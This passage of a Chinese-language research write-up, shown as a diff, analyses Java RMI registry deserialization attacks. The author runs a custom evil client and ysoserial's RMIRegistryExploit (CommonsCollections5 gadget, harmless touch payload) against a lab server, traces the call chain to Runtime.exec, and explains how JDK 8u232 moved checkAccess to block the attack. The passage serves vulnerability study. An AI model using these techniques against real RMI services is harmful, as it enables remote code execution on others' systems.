--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer any
+-cp "commons-collections-3.1.jar:." \
+EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
+
+与EvilRMIRegistryClientWithBadAttributeValueExpException不同，
+EvilRMIRegistryClientWithBadAttributeValueExpException3会抛出异常:
+
+Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
+        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+        java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
+        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:420)
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
+        at sun.rmi.transport.Transport$1.run(Transport.java:200)
+        at sun.rmi.transport.Transport$1.run(Transport.java:197)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/1947500295.run(Unknown Source)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
+        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+        at java.lang.Thread.run(Thread.java:745)
+        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
+        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
+        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
+        at sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)
+        at EvilRMIRegistryClientWithBadAttributeValueExpException3.main(EvilRMIRegistryClientWithBadAttributeValueExpException3.java:109)
+Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+        java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
+        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
+        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
+        at sun.rmi.transport.Transport$1.run(Transport.java:200)
+        at sun.rmi.transport.Transport$1.run(Transport.java:197)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/1947500295.run(Unknown Source)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
+        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+        at java.lang.Thread.run(Thread.java:745)
+Caused by: java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
+        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:396)
+        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:186)
+        at java.rmi.server.RMIClassLoader$2.loadClass(RMIClassLoader.java:637)
+        at java.rmi.server.RMIClassLoader.loadClass(RMIClassLoader.java:264)
+        at sun.rmi.server.MarshalInputStream.resolveClass(MarshalInputStream.java:214)
+        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1613)
+        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1518)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1774)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
+        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1993)
+        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1918)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
+        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
+        ... 16 more
+
+RMIRegistryServer找不到GeneralInvocationHandler3，因为这不是rt.jar中的类，
+是个自实现类。
+
+之前读[57]时就在想，周知端口上哪儿找自实现InvocationHandler去？现实世界对
+攻击者不会那么友好，远程codebase之类的就不要想了。看到上述异常，差点以为
+[57]的作者在胡说八道。不死心地去查了一下/tmp目录，发现touch命令居然执行了。
+
+调试RMIRegistryServer:
+
+java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+```java
+/*
+ * sun.rmi.server.LoaderHandler.loadClass
+ *
+ * 8u40，361行
+ */
+private static Class<?> loadClass(URL[] paramArrayOfURL, String paramString)
+--------------------------------------------------------------------------
+
+在Eclipse里对上述函数设置条件断点:
+
+arg1.equals("GeneralInvocationHandler3")
+
+命中时调用栈回溯如下:
+
+sun.rmi.server.LoaderHandler.loadClass(java.net.URL[], java.lang.String) line: 364
+sun.rmi.server.LoaderHandler.loadClass(java.lang.String, java.lang.String, java.lang.ClassLoader) line: 186
+java.rmi.server.RMIClassLoader$2.loadClass(java.lang.String, java.lang.String, java.lang.ClassLoader) line: 637
+java.rmi.server.RMIClassLoader.loadClass(java.lang.String, java.lang.String, java.lang.ClassLoader) line: 264
+sun.rmi.transport.ConnectionInputStream(sun.rmi.server.MarshalInputStream).resolveClass(java.io.ObjectStreamClass) line: 214
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readNonProxyDesc(boolean) line: 1613
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readClassDesc(boolean) line: 1518
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 1774
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1351
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).defaultReadFields(java.lang.Object, java.io.ObjectStreamClass) line: 1993
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 1918
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 1801
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1351
+sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 371
+sun.rmi.registry.RegistryImpl_Skel.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int, long) line: not available
+sun.rmi.server.UnicastServerRef.oldDispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int) line: 410
+sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 268
+sun.rmi.transport.Transport$1.run() line: 200
+sun.rmi.transport.Transport$1.run() line: 197
+java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
+sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
+sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 568
+sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 826
+sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78() line: 683
+sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.1433130086.run() line: not available
+java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
+sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 682
+java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1142
+java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 617
+java.lang.Thread.run() line: 745
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in java.lang.Runtime.exec(java.lang.String[])
+
+  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
+  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
+  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
+  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
+  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
+  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.toString (TiedMapEntry.java:131), pc = 20
+  [11] javax.management.BadAttributeValueExpException.readObject (BadAttributeValueExpException.java:86), pc = 97
+  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [15] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
+  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
+  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
+  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [20] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
+  [21] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,918), pc = 173
+  [22] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [23] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [24] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
+  [25] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,918), pc = 173
+  [26] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
+  [27] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
+  [28] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
+  [29] sun.rmi.registry.RegistryImpl_Skel.dispatch (null), pc = 370
+  [30] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
+  [31] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
+  [32] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [33] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [34] java.security.AccessController.doPrivileged (native method)
+  [35] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [36] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
+  [37] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:826), pc = 685
+  [38] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
+  [39] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.2050827014.run (null), pc = 4
+  [40] java.security.AccessController.doPrivileged (native method)
+  [41] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
+  [42] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
+  [43] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
+  [44] java.lang.Thread.run (Thread.java:745), pc = 11
+
+7.1) 远程测试
+
+在192.168.65.23上:
+
+$ ls -l
+RMIRegistryServer.class
+commons-collections-3.1.jar
+
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.20 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+在192.168.65.20上:
+
+$ ls -1
+EvilRMIRegistryClientWithBadAttributeValueExpException3.class
+GeneralInvocationHandler3.class
+commons-collections-3.1.jar
+ysoserial-0.0.6-SNAPSHOT-all.jar
+
+java_8_232 \
+-cp "commons-collections-3.1.jar:." \
+EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
+
+客户端抛出异常:
+
+Caused by: java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
+
+在192.168.65.20上:
+
+java_8_232 \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
+"/bin/touch /tmp/scz_is_here"
+
+客户端抛出异常:
+
+Caused by: java.rmi.AccessException: Registry.Registry.bind disallowed; origin /192.168.65.20 is non-local host
+
+虽然两次客户端命令都得到异常，但每次都得手了。第一次客户端命令使用的
+InvocationHandler是服务端找不到的GeneralInvocationHandler3，服务端流程不会
+到达RegistryImpl.checkAccess()。第二次客户端命令使用的InvocationHandler是
+AnnotationInvocationHandler，服务端能找到，服务端流程会到达
+RegistryImpl.checkAccess()。后面第10小节会细讲，这里用断点简单确认一下:
+
+java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-Djava.rmi.server.hostname=192.168.65.20 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in sun.rmi.registry.RegistryImpl.checkAccess
+
+  [1] sun.rmi.registry.RegistryImpl.checkAccess (RegistryImpl.java:244), pc = 0
+  [2] sun.rmi.registry.RegistryImpl.bind (RegistryImpl.java:179), pc = 2
+  [3] sun.rmi.registry.RegistryImpl_Skel.dispatch (null), pc = 153
+  [4] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
+  [5] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
+  [6] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [7] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [8] java.security.AccessController.doPrivileged (native method)
+  [9] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [10] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
+  [11] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:826), pc = 685
+  [12] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
+  [13] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.1433130086.run (null), pc = 4
+  [14] java.security.AccessController.doPrivileged (native method)
+  [15] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
+  [16] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
+  [17] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
+  [18] java.lang.Thread.run (Thread.java:745), pc = 11
+
+8) 简化版调用关系(重点看这个)
+
+强调一下，这主要是8u40的调用关系，夹杂了一些8u232的变化。
+
+--------------------------------------------------------------------------
+TCPTransport.handleMessages                                 // 8u40
+  Transport.serviceCall
+    UnicastServerRef.dispatch
+      UnicastServerRef.oldDispatch
+        RegistryImpl_Skel.dispatch                          // UnicastServerRef:410
+          RegistryImpl.checkAccess                          // 位于RegistryImpl_Skel.class中
+                                                            // 8u232在此增加的调用，8u40无此调用
+                                                            // 即使8u232没有其他安全增强，远程"ysoserial/RMIRegistryExploit"也因此而废
+          ObjectInputStream.readObject                      // 位于RegistryImpl_Skel.class中
+            ObjectInputStream.readOrdinaryObject:1774
+                ObjectInputStream.readClassDesc
+                  ObjectInputStream.readNonProxyDesc
+                    MarshalInputStream.resolveClass
+                      RMIClassLoader.loadClass
+                        LoaderHandler.loadClass             // LoaderHandler:361
+                          Class.forName                     // LoaderHandler:378
+                                                            // 尝试加载GeneralInvocationHandler3
+                                                            // 没找到，抛异常，该异常最终会发往客户端
+            ObjectInputStream.readOrdinaryObject:1795       // 处理没找到GeneralInvocationHandler3的异常
+                                                            // 流程不会在此中止
+            ObjectInputStream.readOrdinaryObject:1801
+              ObjectInputStream.readSerialData
+                ObjectInputStream.defaultReadFields         // 8u232在此增加的调用，8u40无此调用
+                  ObjectInputStream.readOrdinaryObject
+                    ObjectInputStream.readClassDesc
+                      ObjectInputStream.readNonProxyDesc
+                        ObjectInputStream.filterCheck
+                          RegistryImpl.registryFilter       // 查看8u232的这个函数，有一张白名单
+                                                            // 失败时返回"ObjectInputFilter.Status.REJECTED"
+                BadAttributeValueExpException.readObject    // ObjectInputStream:1896
+                                                            // ysoserial/CommonsCollections5
+                                                            // 对应客户端的bave变量
+                  TiedMapEntry.toString                     // TiedMapEntry.hashCode()、TiedMapEntry.toString
+                                                            // 都会调用TiedMapEntry.getValue()
+                    TiedMapEntry.getValue
+                      LazyMap.get                           // 此处开始LazyMap利用链
+                        ChainedTransformer.transform
+                          InvokerTransformer.transform
+                            Runtime.exec                    // 执行恶意代码
+          RegistryImpl.rebind                               // 位于RegistryImpl_Skel.class中
+            RegistryImpl.checkAccess                        // 检查rebind()的源IP与目标IP是否位于同一主机，不是则抛出异常
+                                                            // 8u232的rebind()不再调用checkAccess()
+        StreamRemoteCall.getResultStream                    // UnicastServerRef:415
+        ServerException.<init>                              // UnicastServerRef:420
+                                                            // 封装服务端捕获的异常，准备发往客户端
+        ObjectOutputStream.writeObject                      // UnicastServerRef:427
+                                                            // 向客户端发送"没找到GeneralInvocationHandler3的异常"
+--------------------------------------------------------------------------
+
+GeneralInvocationHandler3不像AnnotationInvocationHandler，前者没有实现
+readObject()，于是ObjectInputStream.readObject()不会调用想像中
+的GeneralInvocationHandler3.readObject()。在反序列化过程尝试寻找
+GeneralInvocationHandler3未果，内层函数抛出异常，但外层捕获这种异常，并有
+相应处理使这种异常可以发往客户端。找不到GeneralInvocationHandler3？无所谓，
+流程继续，仍将触发恶意代码。GeneralInvocationHandler3存在的意义仅仅是让客
+户端可以生成remoteProxy，服务端的中招流程不需要它。
+
+再次说明，别瞎YY，如果怀疑别人([57])的说法，就去验证之。要是不验证就喷，丢
+大发人了。
+
+之前我还YY过，是不是先触发恶意代码再尝试寻找GeneralInvocationHandler3？一
+般来说抛异常时流程就中止了。曾经把这个YY想法记了一笔，但在写简化版调用关系
+时得严谨，用Eclipse的条件断点看调用栈，用BC对比exec()的调用栈，就发现分岔
+点在"readOrdinaryObject:1774"，发现之前的YY是错的。写文档是一个再提升的过
+程，对自己要求严一些没坏处。
+
+调试EvilRMIRegistryClientWithBadAttributeValueExpException3，确认恶意代码
+不是在客户端执行的:
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "commons-collections-3.1.jar:." \
+EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in java.lang.Runtime.exec(java.lang.String[])
+
+无命中，放心了。
+
+9) ysoserial/RMIRegistryExploit
+
+参[52]
+
+https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
+
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
+"/bin/touch /tmp/scz_is_here"
+
+回顾整个攻击链，服务端看到的是remoteProxy，对之反序列化，只要有个什么东西
+跟remoteProxy有关联，就会一块反序列化。InvocationHandler天然与remoteProxy
+有关联，从而只要有个什么东西与InvocationHandler有关联，就会一块反序列化。
+
+如果不仔细，看RMIRegistryExploit.java的代码有可能引起误会，main()中有一句:
+
+String className = CommonsCollections1.class.getPackage().getName() + "." + args[2];
+
+有人说RMIRegistryExploit用的是CommonsCollections1，再仔细看，是这么回事吗？
+这句代码实际相当于:
+
+String className = "ysoserial.payloads" + "." + args[2];
+
+10) sun.rmi.registry.RegistryImpl.checkAccess
+
+参看:
+
+《Java RMI入门》
+http://scz.617.cn/network/202002221000.txt
+
+周知端口与动态端口不在同一台主机上时，正常的远程rebind()就会失败。后面实验
+所涉及的class全部源自上述URL，不在本篇重复提供。
+
+在192.168.65.23上:
+
+$ ls -l
+HelloRMIWellknownServer.class
+HelloRMIInterface.class
+HelloRMIServerSocketFactoryImpl.class
+
+$ java_8_40 HelloRMIWellknownServer 192.168.65.23 1099 192.168.65.20
+
+在192.168.65.20上:
+
+$ ls -1
+HelloRMIDynamicServer.class
+HelloRMIInterface.class
+HelloRMIInterfaceImpl3.class
+HelloRMIServerSocketFactoryImpl.class
+
+$ java_8_232 HelloRMIDynamicServer 192.168.65.23 1099 192.168.65.20 0 anything
+Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
+        java.rmi.AccessException: Registry.Registry.rebind disallowed; origin /192.168.65.20 is non-local host
+        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:420)
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
+        at sun.rmi.transport.Transport$1.run(Transport.java:200)
+        at sun.rmi.transport.Transport$1.run(Transport.java:197)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/840376522.run(Unknown Source)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
+        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+        at java.lang.Thread.run(Thread.java:745)
+        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
+        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
+        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
+        at sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)
+        at HelloRMIDynamicServer.main(HelloRMIDynamicServer.java:27)
+Caused by: java.rmi.AccessException: Registry.Registry.rebind disallowed; origin /192.168.65.20 is non-local host
+        at sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:287)
+        at sun.rmi.registry.RegistryImpl.rebind(RegistryImpl.java:212)
+        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
+        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
+        at sun.rmi.transport.Transport$1.run(Transport.java:200)
+        at sun.rmi.transport.Transport$1.run(Transport.java:197)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/840376522.run(Unknown Source)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
+        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+        at java.lang.Thread.run(Thread.java:745)
+
+checkAccess()会检查rebind()的源IP与目标IP是否位于同一主机，不是则抛出异常
+java.rmi.AccessException，换句话说，远程rebind()不会成功。TCP层没有限制，
+检查是Java RMI自己加的。在盯上"ysoserial/RMIRegistryExploit"之前就知道这事，
+还跟KINGX专门提过，但等我去看RMIRegistryExploit.java时，赫然发现它在远程
+rebind()。然后我开始YY，是不是老版没有checkAccess()？但8u40有这个函数。然
+后我提出一个设想，可能checkAccess()已经很靠后了，恶意代码在它之前得到执行。
+为了做实验，只好去学了一番"Commons Collections反序列化漏洞"，这就是:
+
+《Java RMI入门(5)》
+http://scz.617.cn/network/202003241127.txt
+
+后面有关于checkAccess()的更多分析，将看到8u232与8u40的不同之处。
+
+11) sun.rmi.registry.RegistryImpl_Skel.dispatch
+
+参看:
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/sun/rmi/registry/RegistryImpl.java
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java
+
+居然没找到8u40的RegistryImpl_Skel.java，先看8u232的吧。
+
+```java
+/*
+ * 8u232
+ *
+ * sun.rmi.registry.RegistryImpl_Skel
+ *
+ * 40行
+ */
+private static final java.rmi.server.Operation[] operations = {
+        new java.rmi.server.Operation("void bind(java.lang.String, java.rmi.Remote)"),
+        new java.rmi.server.Operation("java.lang.String list()[]"),
+        new java.rmi.server.Operation("java.rmi.Remote lookup(java.lang.String)"),
+        new java.rmi.server.Operation("void rebind(java.lang.String, java.rmi.Remote)"),
+        new java.rmi.server.Operation("void unbind(java.lang.String)")
+};
+
+/*
+ * 48行，参看:
+ *
+ * 《Java RMI入门》
+ * http://scz.617.cn/network/202002221000.txt
+ *
+ * 10.2.1) HelloRMI_6.cap部分报文解码
+ *
+ * 就是那个哈希0x44154dc9d4e63bdf
+ */
+private static final long interfaceHash = 4905912898345647071L;
+
+/*
+ * 54行
+ */
+public void dispatch(java.rmi.Remote obj, java.rmi.server.RemoteCall remoteCall, int opnum, long hash)
+        throws java.lang.Exception {
+    if (opnum < 0) {
+        if (hash == 7583982177005850366L) {
+            opnum = 0;
+        } else if (hash == 2571371476350237748L) {
+            opnum = 1;
+        } else if (hash == -7538657168040752697L) {
+            opnum = 2;
+        } else if (hash == -8381844669958460146L) {
+            opnum = 3;
+        } else if (hash == 7305022919901907578L) {
+            opnum = 4;
+        } else {
+            throw new java.rmi.UnmarshalException("invalid method hash");
+        }
+    } else {
+        if (hash != interfaceHash)
+            throw new java.rmi.server.SkeletonMismatchException("interface hash mismatch");
+    }
+
+    sun.rmi.registry.RegistryImpl server = (sun.rmi.registry.RegistryImpl) obj;
+    StreamRemoteCall call = (StreamRemoteCall) remoteCall;
+    switch (opnum) {
+        case 0: // bind(String, Remote)
+        {
+            /*
+             * 81行，8u232相比8u40有一个很大的安全增强，前者把
+             * RegistryImpl.checkAccess()挪到ObjectInputStream.readObject()
+             * 之前了，这使得远程bind()、rebind()彻底不可行，远程
+             * "ysoserial/RMIRegistryExploit"就这么废了。
+             */
+            // Check access before reading the arguments
+            RegistryImpl.checkAccess("Registry.bind");
+
+            java.lang.String $param_String_1;
+            java.rmi.Remote $param_Remote_2;
+            try {
+                java.io.ObjectInput in = call.getInputStream();
+                $param_String_1 = (java.lang.String) in.readObject();
+                $param_Remote_2 = (java.rmi.Remote) in.readObject();
+            } catch (ClassCastException | IOException | ClassNotFoundException e) {
+                call.discardPendingRefs();
+                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
+            } finally {
+                call.releaseInputStream();
+            }
+            server.bind($param_String_1, $param_Remote_2);
+            try {
+                call.getResultStream(true);
+            } catch (java.io.IOException e) {
+                throw new java.rmi.MarshalException("error marshalling return", e);
+            }
+            break;
+        }
+
+        case 1: // list()
+        {
+            call.releaseInputStream();
